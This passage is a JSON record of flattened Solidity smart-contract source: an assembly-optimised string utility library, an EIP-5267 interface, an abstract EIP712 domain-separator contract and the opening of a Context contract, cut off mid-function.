{"SourceCode": "// File: contracts/utils/LibString.sol\r\n\r\n\r\npragma solidity ^0.8.4;\r\n\r\nlibrary LibString {\r\n\r\n    error HexLengthInsufficient();\r\n\r\n    /// @dev The constant returned when the `search` is not found in the string.\r\n    uint256 internal constant NOT_FOUND = uint256(int256(-1));\r\n\r\n    /// @dev Returns the base 10 decimal representation of `value`.\r\n    function toString(uint256 value) internal pure returns (string memory str) {\r\n        assembly {\r\n            // The maximum value of a uint256 contains 78 digits (1 byte per digit), but\r\n            // we allocate 0xa0 bytes to keep the free memory pointer 32-byte word aligned.\r\n            // We will need 1 word for the trailing zeros padding, 1 word for the length,\r\n            // and 3 words for a maximum of 78 digits. Total: 5 * 0x20 = 0xa0.\r\n            let m := add(mload(0x40), 0xa0)\r\n            // Update the free memory pointer to allocate.\r\n            mstore(0x40, m)\r\n            // Assign the `str` to the end.\r\n            str := sub(m, 0x20)\r\n            // Zeroize the slot after the string.\r\n            mstore(str, 0)\r\n\r\n            // Cache the end of the memory to calculate the length later.\r\n            let end := str\r\n\r\n            // We write the string from rightmost digit to leftmost digit.\r\n            // The following is essentially a do-while loop that also handles the zero case.\r\n            // prettier-ignore\r\n            for { let temp := value } 1 {} {\r\n                str := sub(str, 1)\r\n                // Write the character to the pointer.\r\n                // The ASCII index of the '0' character is 48.\r\n                mstore8(str, add(48, mod(temp, 10)))\r\n                // Keep dividing `temp` until zero.\r\n                temp := div(temp, 10)\r\n                // prettier-ignore\r\n                if iszero(temp) { break }\r\n            }\r\n\r\n            let length := sub(end, str)\r\n            // Move the pointer 32 bytes leftwards to make room for the length.\r\n            str := sub(str, 0x20)\r\n            // Store the length.\r\n            mstore(str, length)\r\n        }\r\n    }\r\n\r\n    /// -----------------------------------------------------------------------\r\n    /// Hexadecimal Operations\r\n    /// -----------------------------------------------------------------------\r\n\r\n    /// @dev Returns the hexadecimal representation of `value`,\r\n    /// left-padded to an input length of `length` bytes.\r\n    /// The output is prefixed with \"0x\" encoded using 2 hexadecimal digits per byte,\r\n    /// giving a total length of `length * 2 + 2` bytes.\r\n    /// Reverts if `length` is too small for the output to contain all the digits.\r\n    function toHexString(uint256 value, uint256 length) internal pure returns (string memory str) {\r\n        assembly {\r\n            let start := mload(0x40)\r\n            // We need 0x20 bytes for the trailing zeros padding, `length * 2` bytes\r\n            // for the digits, 0x02 bytes for the prefix, and 0x20 bytes for the length.\r\n            // We add 0x20 to the total and round down to a multiple of 0x20.\r\n            // (0x20 + 0x20 + 0x02 + 0x20) = 0x62.\r\n            let m := add(start, and(add(shl(1, length), 0x62), not(0x1f)))\r\n            // Allocate the memory.\r\n            mstore(0x40, m)\r\n            // Assign the `str` to the end.\r\n            str := sub(m, 0x20)\r\n            // Zeroize the slot after the string.\r\n            mstore(str, 0)\r\n\r\n            // Cache the end to calculate the length later.\r\n            let end := str\r\n            // Store \"0123456789abcdef\" in scratch space.\r\n            mstore(0x0f, 0x30313233343536373839616263646566)\r\n\r\n            let temp := value\r\n            // We write the string from rightmost digit to leftmost digit.\r\n            // The following is essentially a do-while loop that also handles the zero case.\r\n            // prettier-ignore\r\n            for {} 1 {} {\r\n                str := sub(str, 2)\r\n                mstore8(add(str, 1), mload(and(temp, 15)))\r\n                mstore8(str, mload(and(shr(4, temp), 15)))\r\n                temp := shr(8, temp)\r\n                length := sub(length, 1)\r\n                // prettier-ignore\r\n                if iszero(length) { break }\r\n            }\r\n\r\n            if temp {\r\n                // Store the function selector of `HexLengthInsufficient()`.\r\n                mstore(0x00, 0x2194895a)\r\n                // Revert with (offset, size).\r\n                revert(0x1c, 0x04)\r\n            }\r\n\r\n            // Compute the string's length.\r\n            let strLength := add(sub(end, str), 2)\r\n            // Move the pointer and write the \"0x\" prefix.\r\n            str := sub(str, 0x20)\r\n            mstore(str, 0x3078)\r\n            // Move the pointer and write the length.\r\n            str := sub(str, 2)\r\n            mstore(str, strLength)\r\n        }\r\n    }\r\n\r\n    /// @dev Returns the hexadecimal representation of `value`.\r\n    /// The output is prefixed with \"0x\" and encoded using 2 hexadecimal digits per byte.\r\n    /// As address are 20 bytes long, the output will left-padded to have\r\n    /// a length of `20 * 2 + 2` bytes.\r\n    function toHexString(uint256 value) internal pure returns (string memory str) {\r\n        assembly {\r\n            let start := mload(0x40)\r\n            // We need 0x20 bytes for the trailing zeros padding, 0x20 bytes for the length,\r\n            // 0x02 bytes for the prefix, and 0x40 bytes for the digits.\r\n            // The next multiple of 0x20 above (0x20 + 0x20 + 0x02 + 0x40) is 0xa0.\r\n            let m := add(start, 0xa0)\r\n            // Allocate the memory.\r\n            mstore(0x40, m)\r\n            // Assign the `str` to the end.\r\n            str := sub(m, 0x20)\r\n            // Zeroize the slot after the string.\r\n            mstore(str, 0)\r\n\r\n            // Cache the end to calculate the length later.\r\n            let end := str\r\n            // Store \"0123456789abcdef\" in scratch space.\r\n            mstore(0x0f, 0x30313233343536373839616263646566)\r\n\r\n            // We write the string from rightmost digit to leftmost digit.\r\n            // The following is essentially a do-while loop that also handles the zero case.\r\n            // prettier-ignore\r\n            for { let temp := value } 1 {} {\r\n                str := sub(str, 2)\r\n                mstore8(add(str, 1), mload(and(temp, 15)))\r\n                mstore8(str, mload(and(shr(4, temp), 15)))\r\n                temp := shr(8, temp)\r\n                // prettier-ignore\r\n                if iszero(temp) { break }\r\n            }\r\n\r\n            // Compute the string's length.\r\n            let strLength := add(sub(end, str), 2)\r\n            // Move the pointer and write the \"0x\" prefix.\r\n            str := sub(str, 0x20)\r\n            mstore(str, 0x3078)\r\n            // Move the pointer and write the length.\r\n            str := sub(str, 2)\r\n            mstore(str, strLength)\r\n        }\r\n    }\r\n\r\n    /// @dev Returns the hexadecimal representation of `value`.\r\n    /// The output is prefixed with \"0x\" and encoded using 2 hexadecimal digits per byte.\r\n    function toHexString(address value) internal pure returns (string memory str) {\r\n        assembly {\r\n            let start := mload(0x40)\r\n            // We need 0x20 bytes for the length, 0x02 bytes for the prefix,\r\n            // and 0x28 bytes for the digits.\r\n            // The next multiple of 0x20 above (0x20 + 0x02 + 0x28) is 0x60.\r\n            str := add(start, 0x60)\r\n\r\n            // Allocate the memory.\r\n            mstore(0x40, str)\r\n            // Store \"0123456789abcdef\" in scratch space.\r\n            mstore(0x0f, 0x30313233343536373839616263646566)\r\n\r\n            let length := 20\r\n            // We write the string from rightmost digit to leftmost digit.\r\n            // The following is essentially a do-while loop that also handles the zero case.\r\n            // prettier-ignore\r\n            for { let temp := value } 1 {} {\r\n                str := sub(str, 2)\r\n                mstore8(add(str, 1), mload(and(temp, 15)))\r\n                mstore8(str, mload(and(shr(4, temp), 15)))\r\n                temp := shr(8, temp)\r\n                length := sub(length, 1)\r\n                // prettier-ignore\r\n                if iszero(length) { break }\r\n            }\r\n\r\n            // Move the pointer and write the \"0x\" prefix.\r\n            str := sub(str, 32)\r\n            mstore(str, 0x3078)\r\n            // Move the pointer and write the length.\r\n            str := sub(str, 2)\r\n            mstore(str, 42)\r\n        }\r\n    }\r\n\r\n    /// -----------------------------------------------------------------------\r\n    /// Other String Operations\r\n    /// -----------------------------------------------------------------------\r\n\r\n    // For performance and bytecode compactness, all indices of the following operations\r\n    // are byte (ASCII) offsets, not UTF character offsets.\r\n\r\n    /// @dev Returns `subject` all occurances of `search` replaced with `replacement`.\r\n    function replace(\r\n        string memory subject,\r\n        string memory search,\r\n        string memory replacement\r\n    ) internal pure returns (string memory result) {\r\n        assembly {\r\n            let subjectLength := mload(subject)\r\n            let searchLength := mload(search)\r\n            let replacementLength := mload(replacement)\r\n\r\n            subject := add(subject, 0x20)\r\n            search := add(search, 0x20)\r\n            replacement := add(replacement, 0x20)\r\n            result := add(mload(0x40), 0x20)\r\n\r\n            let subjectEnd := add(subject, subjectLength)\r\n            if iszero(gt(searchLength, subjectLength)) {\r\n                let subjectSearchEnd := add(sub(subjectEnd, searchLength), 1)\r\n                let h := 0\r\n                if iszero(lt(searchLength, 32)) {\r\n                    h := keccak256(search, searchLength)\r\n                }\r\n                let m := shl(3, sub(32, and(searchLength, 31)))\r\n                let s := mload(search)\r\n                // prettier-ignore\r\n                for {} 1 {} {\r\n                    let t := mload(subject)\r\n                    // Whether the first `searchLength % 32` bytes of \r\n                    // `subject` and `search` matches.\r\n                    if iszero(shr(m, xor(t, s))) {\r\n                        if h {\r\n                            if iszero(eq(keccak256(subject, searchLength), h)) {\r\n                                mstore(result, t)\r\n                                result := add(result, 1)\r\n                                subject := add(subject, 1)\r\n                                // prettier-ignore\r\n                                if iszero(lt(subject, subjectSearchEnd)) { break }\r\n                                continue\r\n                            }\r\n                        }\r\n                        // Copy the `replacement` one word at a time.\r\n                        // prettier-ignore\r\n                        for { let o := 0 } 1 {} {\r\n                            mstore(add(result, o), mload(add(replacement, o)))\r\n                            o := add(o, 0x20)\r\n                            // prettier-ignore\r\n                            if iszero(lt(o, replacementLength)) { break }\r\n                        }\r\n                        result := add(result, replacementLength)\r\n                        subject := add(subject, searchLength)\r\n                        if searchLength {\r\n                            // prettier-ignore\r\n                            if iszero(lt(subject, subjectSearchEnd)) { break }\r\n                            continue\r\n                        }\r\n                    }\r\n                    mstore(result, t)\r\n                    result := add(result, 1)\r\n                    subject := add(subject, 1)\r\n                    // prettier-ignore\r\n                    if iszero(lt(subject, subjectSearchEnd)) { break }\r\n                }\r\n            }\r\n\r\n            let resultRemainder := result\r\n            result := add(mload(0x40), 0x20)\r\n            let k := add(sub(resultRemainder, result), sub(subjectEnd, subject))\r\n            // Copy the rest of the string one word at a time.\r\n            // prettier-ignore\r\n            for {} lt(subject, subjectEnd) {} {\r\n                mstore(resultRemainder, mload(subject))\r\n                resultRemainder := add(resultRemainder, 0x20)\r\n                subject := add(subject, 0x20)\r\n            }\r\n            result := sub(result, 0x20)\r\n            // Zeroize the slot after the string.\r\n            let last := add(add(result, 0x20), k)\r\n            mstore(last, 0)\r\n            // Allocate memory for the length and the bytes,\r\n            // rounded up to a multiple of 32.\r\n            mstore(0x40, and(add(last, 31), not(31)))\r\n            // Store the length of the result.\r\n            mstore(result, k)\r\n        }\r\n    }\r\n\r\n    /// @dev Returns the byte index of the first location of `search` in `subject`,\r\n    /// searching from left to right, starting from `from`.\r\n    /// Returns `NOT_FOUND` (i.e. `type(uint256).max`) if the `search` is not found.\r\n    function indexOf(string memory subject, string memory search, uint256 from) internal pure returns (uint256 result) {\r\n        assembly {\r\n            // prettier-ignore\r\n            for { let subjectLength := mload(subject) } 1 {} {\r\n                if iszero(mload(search)) {\r\n                    // `result = min(from, subjectLength)`.\r\n                    result := xor(from, mul(xor(from, subjectLength), lt(subjectLength, from)))\r\n                    break\r\n                }\r\n                let searchLength := mload(search)\r\n                let subjectStart := add(subject, 0x20)    \r\n                \r\n                result := not(0) // Initialize to `NOT_FOUND`.\r\n\r\n                subject := add(subjectStart, from)\r\n                let subjectSearchEnd := add(sub(add(subjectStart, subjectLength), searchLength), 1)\r\n\r\n                let m := shl(3, sub(32, and(searchLength, 31)))\r\n                let s := mload(add(search, 0x20))\r\n\r\n                // prettier-ignore\r\n                if iszero(lt(subject, subjectSearchEnd)) { break }\r\n\r\n                if iszero(lt(searchLength, 32)) {\r\n                    // prettier-ignore\r\n                    for { let h := keccak256(add(search, 0x20), searchLength) } 1 {} {\r\n                        if iszero(shr(m, xor(mload(subject), s))) {\r\n                            if eq(keccak256(subject, searchLength), h) {\r\n                                result := sub(subject, subjectStart)\r\n                                break\r\n                            }\r\n                        }\r\n                        subject := add(subject, 1)\r\n                        // prettier-ignore\r\n                        if iszero(lt(subject, subjectSearchEnd)) { break }\r\n                    }\r\n                    break\r\n                }\r\n                // prettier-ignore\r\n                for {} 1 {} {\r\n                    if iszero(shr(m, xor(mload(subject), s))) {\r\n                        result := sub(subject, subjectStart)\r\n                        break\r\n                    }\r\n                    subject := add(subject, 1)\r\n                    // prettier-ignore\r\n                    if iszero(lt(subject, subjectSearchEnd)) { break }\r\n                }\r\n                break\r\n            }\r\n        }\r\n    }\r\n\r\n    /// @dev Returns the byte index of the first location of `search` in `subject`,\r\n    /// searching from left to right.\r\n    /// Returns `NOT_FOUND` (i.e. `type(uint256).max`) if the `search` is not found.\r\n    function indexOf(string memory subject, string memory search) internal pure returns (uint256 result) {\r\n        result = indexOf(subject, search, 0);\r\n    }\r\n\r\n    /// @dev Returns the byte index of the first location of `search` in `subject`,\r\n    /// searching from right to left, starting from `from`.\r\n    /// Returns `NOT_FOUND` (i.e. `type(uint256).max`) if the `search` is not found.\r\n    function lastIndexOf(\r\n        string memory subject,\r\n        string memory search,\r\n        uint256 from\r\n    ) internal pure returns (uint256 result) {\r\n        assembly {\r\n            // prettier-ignore\r\n            for {} 1 {} {\r\n                let searchLength := mload(search)\r\n                let fromMax := sub(mload(subject), searchLength)\r\n                if iszero(gt(fromMax, from)) {\r\n                    from := fromMax\r\n                }\r\n                if iszero(mload(search)) {\r\n                    result := from\r\n                    break\r\n                }\r\n                result := not(0) // Initialize to `NOT_FOUND`.\r\n\r\n                let subjectSearchEnd := sub(add(subject, 0x20), 1)\r\n\r\n                subject := add(add(subject, 0x20), from)\r\n                // prettier-ignore\r\n                if iszero(gt(subject, subjectSearchEnd)) { break }\r\n                // As this function is not too often used,\r\n                // we shall simply use keccak256 for smaller bytecode size.\r\n                // prettier-ignore\r\n                for { let h := keccak256(add(search, 0x20), searchLength) } 1 {} {\r\n                    if eq(keccak256(subject, searchLength), h) {\r\n                        result := sub(subject, add(subjectSearchEnd, 1))\r\n                        break\r\n                    }\r\n                    subject := sub(subject, 1)\r\n                    // prettier-ignore\r\n                    if iszero(gt(subject, subjectSearchEnd)) { break }\r\n                }\r\n                break\r\n            }\r\n        }\r\n    }\r\n\r\n    /// @dev Returns the index of the first location of `search` in `subject`,\r\n    /// searching from right to left.\r\n    /// Returns `NOT_FOUND` (i.e. `type(uint256).max`) if the `search` is not found.\r\n    function lastIndexOf(string memory subject, string memory search) internal pure returns (uint256 result) {\r\n        result = lastIndexOf(subject, search, uint256(int256(-1)));\r\n    }\r\n\r\n    /// @dev Returns whether `subject` starts with `search`.\r\n    function startsWith(string memory subject, string memory search) internal pure returns (bool result) {\r\n        assembly {\r\n            let searchLength := mload(search)\r\n            // Just using keccak256 directly is actually cheaper.\r\n            result := and(\r\n                iszero(gt(searchLength, mload(subject))),\r\n                eq(keccak256(add(subject, 0x20), searchLength), keccak256(add(search, 0x20), searchLength))\r\n            )\r\n        }\r\n    }\r\n\r\n    /// @dev Returns whether `subject` ends with `search`.\r\n    function endsWith(string memory subject, string memory search) internal pure returns (bool result) {\r\n        assembly {\r\n            let searchLength := mload(search)\r\n            let subjectLength := mload(subject)\r\n            // Whether `search` is not longer than `subject`.\r\n            let withinRange := iszero(gt(searchLength, subjectLength))\r\n            // Just using keccak256 directly is actually cheaper.\r\n            result := and(\r\n                withinRange,\r\n                eq(\r\n                    keccak256(\r\n                        // `subject + 0x20 + max(subjectLength - searchLength, 0)`.\r\n                        add(add(subject, 0x20), mul(withinRange, sub(subjectLength, searchLength))),\r\n                        searchLength\r\n                    ),\r\n                    keccak256(add(search, 0x20), searchLength)\r\n                )\r\n            )\r\n        }\r\n    }\r\n\r\n    /// @dev Returns `subject` repeated `times`.\r\n    function repeat(string memory subject, uint256 times) internal pure returns (string memory result) {\r\n        assembly {\r\n            let subjectLength := mload(subject)\r\n            if iszero(or(iszero(times), iszero(subjectLength))) {\r\n                subject := add(subject, 0x20)\r\n                result := mload(0x40)\r\n                let output := add(result, 0x20)\r\n                // prettier-ignore\r\n                for {} 1 {} {\r\n                    // Copy the `subject` one word at a time.\r\n                    // prettier-ignore\r\n                    for { let o := 0 } 1 {} {\r\n                        mstore(add(output, o), mload(add(subject, o)))\r\n                        o := add(o, 0x20)\r\n                        // prettier-ignore\r\n                        if iszero(lt(o, subjectLength)) { break }\r\n                    }\r\n                    output := add(output, subjectLength)\r\n                    times := sub(times, 1)\r\n                    // prettier-ignore\r\n                    if iszero(times) { break }\r\n                }\r\n                // Zeroize the slot after the string.\r\n                mstore(output, 0)\r\n                // Store the length.\r\n                let resultLength := sub(output, add(result, 0x20))\r\n                mstore(result, resultLength)\r\n                // Allocate memory for the length and the bytes,\r\n                // rounded up to a multiple of 32.\r\n                mstore(0x40, add(result, and(add(resultLength, 63), not(31))))\r\n            }\r\n        }\r\n    }\r\n\r\n    /// @dev Returns a copy of `subject` sliced from `start` to `end` (exclusive).\r\n    /// `start` and `end` are byte offsets.\r\n    function slice(string memory subject, uint256 start, uint256 end) internal pure returns (string memory result) {\r\n        assembly {\r\n            let subjectLength := mload(subject)\r\n            if iszero(gt(subjectLength, end)) {\r\n                end := subjectLength\r\n            }\r\n            if iszero(gt(subjectLength, start)) {\r\n                start := subjectLength\r\n            }\r\n            if lt(start, end) {\r\n                result := mload(0x40)\r\n                let resultLength := sub(end, start)\r\n                mstore(result, resultLength)\r\n                subject := add(subject, start)\r\n                // Copy the `subject` one word at a time, backwards.\r\n                // prettier-ignore\r\n                for { let o := and(add(resultLength, 31), not(31)) } 1 {} {\r\n                    mstore(add(result, o), mload(add(subject, o)))\r\n                    o := sub(o, 0x20)\r\n                    // prettier-ignore\r\n                    if iszero(o) { break }\r\n                }\r\n                // Zeroize the slot after the string.\r\n                mstore(add(add(result, 0x20), resultLength), 0)\r\n                // Allocate memory for the length and the bytes,\r\n                // rounded up to a multiple of 32.\r\n                mstore(0x40, add(result, and(add(resultLength, 63), not(31))))\r\n            }\r\n        }\r\n    }\r\n\r\n    /// @dev Returns a copy of `subject` sliced from `start` to the end of the string.\r\n    /// `start` is a byte offset.\r\n    function slice(string memory subject, uint256 start) internal pure returns (string memory result) {\r\n        result = slice(subject, start, uint256(int256(-1)));\r\n    }\r\n\r\n    /// @dev Returns all the indices of `search` in `subject`.\r\n    /// The indices are byte offsets.\r\n    function indicesOf(string memory subject, string memory search) internal pure returns (uint256[] memory result) {\r\n        assembly {\r\n            let subjectLength := mload(subject)\r\n            let searchLength := mload(search)\r\n\r\n            if iszero(gt(searchLength, subjectLength)) {\r\n                subject := add(subject, 0x20)\r\n                search := add(search, 0x20)\r\n                result := add(mload(0x40), 0x20)\r\n\r\n                let subjectStart := subject\r\n                let subjectSearchEnd := add(sub(add(subject, subjectLength), searchLength), 1)\r\n                let h := 0\r\n                if iszero(lt(searchLength, 32)) {\r\n                    h := keccak256(search, searchLength)\r\n                }\r\n                let m := shl(3, sub(32, and(searchLength, 31)))\r\n                let s := mload(search)\r\n                // prettier-ignore\r\n                for {} 1 {} {\r\n                    let t := mload(subject)\r\n                    // Whether the first `searchLength % 32` bytes of \r\n                    // `subject` and `search` matches.\r\n                    if iszero(shr(m, xor(t, s))) {\r\n                        if h {\r\n                            if iszero(eq(keccak256(subject, searchLength), h)) {\r\n                                subject := add(subject, 1)\r\n                                // prettier-ignore\r\n                                if iszero(lt(subject, subjectSearchEnd)) { break }\r\n                                continue\r\n                            }\r\n                        }\r\n                        // Append to `result`.\r\n                        mstore(result, sub(subject, subjectStart))\r\n                        result := add(result, 0x20)\r\n                        // Advance `subject` by `searchLength`.\r\n                        subject := add(subject, searchLength)\r\n                        if searchLength {\r\n                            // prettier-ignore\r\n                            if iszero(lt(subject, subjectSearchEnd)) { break }\r\n                            continue\r\n                        }\r\n                    }\r\n                    subject := add(subject, 1)\r\n                    // prettier-ignore\r\n                    if iszero(lt(subject, subjectSearchEnd)) { break }\r\n                }\r\n                let resultEnd := result\r\n                // Assign `result` to the free memory pointer.\r\n                result := mload(0x40)\r\n                // Store the length of `result`.\r\n                mstore(result, shr(5, sub(resultEnd, add(result, 0x20))))\r\n                // Allocate memory for result.\r\n                // We allocate one more word, so this array can be recycled for {split}.\r\n                mstore(0x40, add(resultEnd, 0x20))\r\n            }\r\n        }\r\n    }\r\n\r\n    /// @dev Returns a arrays of strings based on the `delimiter` inside of the `subject` string.\r\n    function split(string memory subject, string memory delimiter) internal pure returns (string[] memory result) {\r\n        uint256[] memory indices = indicesOf(subject, delimiter);\r\n        assembly {\r\n            if mload(indices) {\r\n                let indexPtr := add(indices, 0x20)\r\n                let indicesEnd := add(indexPtr, shl(5, add(mload(indices), 1)))\r\n                mstore(sub(indicesEnd, 0x20), mload(subject))\r\n                mstore(indices, add(mload(indices), 1))\r\n                let prevIndex := 0\r\n                // prettier-ignore\r\n                for {} 1 {} {\r\n                    let index := mload(indexPtr)\r\n                    mstore(indexPtr, 0x60)                        \r\n                    if iszero(eq(index, prevIndex)) {\r\n                        let element := mload(0x40)\r\n                        let elementLength := sub(index, prevIndex)\r\n                        mstore(element, elementLength)\r\n                        // Copy the `subject` one word at a time, backwards.\r\n                        // prettier-ignore\r\n                        for { let o := and(add(elementLength, 31), not(31)) } 1 {} {\r\n                            mstore(add(element, o), mload(add(add(subject, prevIndex), o)))\r\n                            o := sub(o, 0x20)\r\n                            // prettier-ignore\r\n                            if iszero(o) { break }\r\n                        }\r\n                        // Zeroize the slot after the string.\r\n                        mstore(add(add(element, 0x20), elementLength), 0)\r\n                        // Allocate memory for the length and the bytes,\r\n                        // rounded up to a multiple of 32.\r\n                        mstore(0x40, add(element, and(add(elementLength, 63), not(31))))\r\n                        // Store the `element` into the array.\r\n                        mstore(indexPtr, element)                        \r\n                    }\r\n                    prevIndex := add(index, mload(delimiter))\r\n                    indexPtr := add(indexPtr, 0x20)\r\n                    // prettier-ignore\r\n                    if iszero(lt(indexPtr, indicesEnd)) { break }\r\n                }\r\n                result := indices\r\n                if iszero(mload(delimiter)) {\r\n                    result := add(indices, 0x20)\r\n                    mstore(result, sub(mload(indices), 2))\r\n                }\r\n            }\r\n        }\r\n    }\r\n\r\n    /// @dev Returns a concatenated string of `a` and `b`.\r\n    /// Cheaper than `string.concat()` and does not de-align the free memory pointer.\r\n    function concat(string memory a, string memory b) internal pure returns (string memory result) {\r\n        assembly {\r\n            result := mload(0x40)\r\n            let aLength := mload(a)\r\n            // Copy `a` one word at a time, backwards.\r\n            // prettier-ignore\r\n            for { let o := and(add(mload(a), 32), not(31)) } 1 {} {\r\n                mstore(add(result, o), mload(add(a, o)))\r\n                o := sub(o, 0x20)\r\n                // prettier-ignore\r\n                if iszero(o) { break }\r\n            }\r\n            let bLength := mload(b)\r\n            let output := add(result, mload(a))\r\n            // Copy `b` one word at a time, backwards.\r\n            // prettier-ignore\r\n            for { let o := and(add(bLength, 32), not(31)) } 1 {} {\r\n                mstore(add(output, o), mload(add(b, o)))\r\n                o := sub(o, 0x20)\r\n                // prettier-ignore\r\n                if iszero(o) { break }\r\n            }\r\n            let totalLength := add(aLength, bLength)\r\n            let last := add(add(result, 0x20), totalLength)\r\n            // Zeroize the slot after the string.\r\n            mstore(last, 0)\r\n            // Stores the length.\r\n            mstore(result, totalLength)\r\n            // Allocate memory for the length and the bytes,\r\n            // rounded up to a multiple of 32.\r\n            mstore(0x40, and(add(last, 31), not(31)))\r\n        }\r\n    }\r\n\r\n    /// @dev Packs a single string with its length into a single word.\r\n    /// Returns `bytes32(0)` if the length is zero or greater than 31.\r\n    function packOne(string memory a) internal pure returns (bytes32 result) {\r\n        assembly {\r\n            // We don't need to zero right pad the string,\r\n            // since this is our own custom non-standard packing scheme.\r\n            result := mul(\r\n                // Load the length and the bytes.\r\n                mload(add(a, 0x1f)),\r\n                // `length != 0 && length < 32`. Abuses underflow.\r\n                // Assumes that the length is valid and within the block gas limit.\r\n                lt(sub(mload(a), 1), 0x1f)\r\n            )\r\n        }\r\n    }\r\n\r\n    /// @dev Unpacks a string packed using {packOne}.\r\n    /// Returns the empty string if `packed` is `bytes32(0)`.\r\n    /// If `packed` is not an output of {packOne}, the output behaviour is undefined.\r\n    function unpackOne(bytes32 packed) internal pure returns (string memory result) {\r\n        assembly {\r\n            // Grab the free memory pointer.\r\n            result := mload(0x40)\r\n            // Allocate 2 words (1 for the length, 1 for the bytes).\r\n            mstore(0x40, add(result, 0x40))\r\n            // Zeroize the length slot.\r\n            mstore(result, 0)\r\n            // Store the length and bytes.\r\n            mstore(add(result, 0x1f), packed)\r\n            // Right pad with zeroes.\r\n            mstore(add(add(result, 0x20), mload(result)), 0)\r\n        }\r\n    }\r\n\r\n    /// @dev Packs two strings with their lengths into a single word.\r\n    /// Returns `bytes32(0)` if combined length is zero or greater than 30.\r\n    function packTwo(string memory a, string memory b) internal pure returns (bytes32 result) {\r\n        assembly {\r\n            let aLength := mload(a)\r\n            // We don't need to zero right pad the strings,\r\n            // since this is our own custom non-standard packing scheme.\r\n            result := mul(\r\n                // Load the length and the bytes of `a` and `b`.\r\n                or(shl(shl(3, sub(0x1f, aLength)), mload(add(a, aLength))), mload(sub(add(b, 0x1e), aLength))),\r\n                // `totalLength != 0 && totalLength < 31`. Abuses underflow.\r\n                // Assumes that the lengths are valid and within the block gas limit.\r\n                lt(sub(add(aLength, mload(b)), 1), 0x1e)\r\n            )\r\n        }\r\n    }\r\n\r\n    /// @dev Unpacks strings packed using {packTwo}.\r\n    /// Returns the empty strings if `packed` is `bytes32(0)`.\r\n    /// If `packed` is not an output of {packTwo}, the output behaviour is undefined.\r\n    function unpackTwo(bytes32 packed) internal pure returns (string memory resultA, string memory resultB) {\r\n        assembly {\r\n            // Grab the free memory pointer.\r\n            resultA := mload(0x40)\r\n            resultB := add(resultA, 0x40)\r\n            // Allocate 2 words for each string (1 for the length, 1 for the byte). Total 4 words.\r\n            mstore(0x40, add(resultB, 0x40))\r\n            // Zeroize the length slots.\r\n            mstore(resultA, 0)\r\n            mstore(resultB, 0)\r\n            // Store the lengths and bytes.\r\n            mstore(add(resultA, 0x1f), packed)\r\n            mstore(add(resultB, 0x1f), mload(add(add(resultA, 0x20), mload(resultA))))\r\n            // Right pad with zeroes.\r\n            mstore(add(add(resultA, 0x20), mload(resultA)), 0)\r\n            mstore(add(add(resultB, 0x20), mload(resultB)), 0)\r\n        }\r\n    }\r\n\r\n    /// @dev Directly returns `a` without copying.\r\n    function directReturn(string memory a) internal pure {\r\n        assembly {\r\n            // Right pad with zeroes. Just in case the string is produced\r\n            // by a method that doesn't zero right pad.\r\n            mstore(add(add(a, 0x20), mload(a)), 0)\r\n            // Store the return offset.\r\n            // Assumes that the string does not start from the scratch space.\r\n            mstore(sub(a, 0x20), 0x20)\r\n            // End the transaction, returning the string.\r\n            return(sub(a, 0x20), add(mload(a), 0x40))\r\n        }\r\n    }\r\n}\r\n// File: contracts/interfaces/IERC5267.sol\r\n\r\n\r\n// OpenZeppelin Contracts (last updated v4.9.0) (interfaces/IERC5267.sol)\r\n\r\npragma solidity ^0.8.19;\r\n\r\ninterface IERC5267 {\r\n    /**\r\n     * @dev MAY be emitted to signal that the domain could have changed.\r\n     */\r\n    event EIP712DomainChanged();\r\n\r\n    /**\r\n     * @dev returns the fields and values that describe the domain separator used by this contract for EIP-712\r\n     * signature.\r\n     */\r\n    function eip712Domain()\r\n        external\r\n        view\r\n        returns (\r\n            bytes1 fields,\r\n            string memory name,\r\n            string memory version,\r\n            uint256 chainId,\r\n            address verifyingContract,\r\n            bytes32 salt,\r\n            uint256[] memory extensions\r\n        );\r\n}\r\n// File: contracts/abstracts/EIP712.sol\r\n\r\n\r\npragma solidity ^0.8.19;\r\n\r\n\r\n\r\nabstract contract EIP712 is IERC5267 {\r\n\r\n    using LibString for *;\r\n\r\n    bytes32 internal constant DOMAIN_TYPEHASH = 0x8b73c3c69bb8fe3d512ecc4cf759cc79239f7b179b0ffacaa9a75d522b39400f;\r\n\r\n    bytes32 internal immutable DOMAIN_NAME;\r\n    bytes32 internal immutable HASHED_DOMAIN_NAME;\r\n\r\n    bytes32 internal immutable DOMAIN_VERSION;\r\n    bytes32 internal immutable HASHED_DOMAIN_VERSION;\r\n\r\n    bytes32 internal immutable INITIAL_DOMAIN_SEPARATOR;\r\n\r\n    uint256 internal immutable INITIAL_CHAIN_ID;\r\n\r\n    constructor(string memory domainName, string memory version) {\r\n        DOMAIN_NAME = domainName.packOne();\r\n        HASHED_DOMAIN_NAME = keccak256(bytes(domainName));\r\n        DOMAIN_VERSION = version.packOne();\r\n        HASHED_DOMAIN_VERSION = keccak256(bytes(version));\r\n        INITIAL_DOMAIN_SEPARATOR = computeDomainSeparator();\r\n        INITIAL_CHAIN_ID = block.chainid;\r\n    }\r\n\r\n    function DOMAIN_SEPARATOR() public view virtual returns (bytes32) {\r\n        return block.chainid == INITIAL_CHAIN_ID ? INITIAL_DOMAIN_SEPARATOR : computeDomainSeparator();\r\n    }\r\n\r\n    function eip712Domain()\r\n        public\r\n        view\r\n        virtual\r\n        returns (\r\n            bytes1 fields,\r\n            string memory name,\r\n            string memory version,\r\n            uint256 chainId,\r\n            address verifyingContract,\r\n            bytes32 salt,\r\n            uint256[] memory extensions\r\n        )\r\n    {\r\n        return (\r\n            hex\"0f\",\r\n            DOMAIN_NAME.unpackOne(),\r\n            DOMAIN_VERSION.unpackOne(),\r\n            block.chainid,\r\n            address(this),\r\n            bytes32(0),\r\n            new uint256[](0)\r\n        );\r\n    }\r\n\r\n    function computeDomainSeparator() internal view virtual returns (bytes32) {\r\n        return\r\n            keccak256(\r\n                abi.encode(DOMAIN_TYPEHASH, HASHED_DOMAIN_NAME, HASHED_DOMAIN_VERSION, block.chainid, address(this))\r\n            );\r\n    }\r\n\r\n    function computeDigest(bytes32 hashStruct) internal view virtual returns (bytes32) {\r\n        return keccak256(abi.encodePacked(\"\\x19\\x01\", DOMAIN_SEPARATOR(), hashStruct));\r\n    }\r\n}\r\n// File: contracts/abstracts/Context.sol\r\n\r\n\r\n\r\npragma solidity ^0.8.19;\r\n\r\nabstract contract Context {\r\n    function _msgSender() internal view virtual returns (address) {\r\n        return msg.sender;\r\n    }\r\n\r\n    function _msgData() internal view virtual returns (bytes calldata) {\r\n        return 